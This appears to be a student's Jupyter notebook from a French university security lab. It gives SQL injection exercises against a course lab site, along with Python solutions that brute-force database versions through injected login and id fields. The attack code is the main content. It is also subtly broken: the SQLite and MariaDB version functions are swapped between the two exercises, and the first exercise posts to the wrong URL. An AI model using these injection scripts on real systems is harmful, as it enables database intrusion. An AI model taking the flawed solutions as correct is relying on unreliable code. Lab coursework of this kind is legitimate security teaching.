{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 3 : Vulnérabilitées web (2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1, l'oracle:\n",
    "Revenons un peux en arrière sur le site de notre mauvais développeur. Nous savons que le site utilise sqlite comme système de gestion de base de donnée mais nous aimerions en identifier la version. Utilisez le site de l'exercice 1 pour récupérer cette information.\n",
    "\n",
    "https://labo.poney.pink/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "def all_versions():\n",
    "    page = requests.get(\"https://www.sqlite.org/chronology.html\")\n",
    "    soup = BeautifulSoup(page.text)\n",
    "\n",
    "    versions = []\n",
    "    for tr in soup.find_all(\"tr\")[1:]:\n",
    "        versions.append(tr.find_all(\"td\")[1].text)\n",
    "\n",
    "    return versions\n",
    "\n",
    "for version in all_versions():\n",
    "    page = requests.post(\n",
    "        \"https://labo.poney.pink/s02/ex2/\",\n",
    "        data={\n",
    "            \"id\": 'OR VERSION() = ' + version + '; --',\n",
    "        },\n",
    "    )\n",
    "\n",
    "    print(version, page.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2, l'aveugle:\n",
    "Pour ce dernier exercice, vous allez travailler un peu à l'aveugle. En effet, la page suicitant notre intérêt cette fois-ci ne contient qu'un formulaire simple qui à priori, ne fait rien ... mais il est injectable (promis) !\n",
    "\n",
    "À vous de trouvez comment et de récupérer la version du système de gestion de base de donnée : https://labo.poney.pink/s02/ex2/\n",
    "\n",
    "Tips:\n",
    "  - Cette fois-ci, c'est plus du sqlite mais du mariadb : https://mariadb.com/kb/en/version/\n",
    "  - Et vous travaillez à l'aveugle ;-)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "def all_versions():\n",
    "    page = requests.get(\"https://mariadb.org/mariadb/all-releases/\")\n",
    "    soup = BeautifulSoup(page.text)\n",
    "\n",
    "    versions = []\n",
    "    for table in soup.find_all(\"table\")[1:]:\n",
    "        for tbody in table.find_all(\"tbody\"):\n",
    "            for tr in tbody.find_all(\"tr\"):\n",
    "                versions.append(tr.find_all(\"td\")[0].text)\n",
    "\n",
    "    return versions\n",
    "\n",
    "for version in all_versions():\n",
    "    page = requests.post(\n",
    "        \"https://labo.poney.pink/s02/ex2/\",\n",
    "        data={\n",
    "            \"login\": '\" OR sqlite_version() = \"' + version + '\"; --',\n",
    "            \"password\": ''\n",
    "        },\n",
    "    )\n",
    "    if \"Good job\" in page.text:\n",
    "        print(\"Version is \" + version)\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 3, bonus:\n",
    "Toujours pour l'exercice 2, pouvez-vous extraire le nom de la base de donnée et l'utilisateur utilisé pour s'y connecter ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
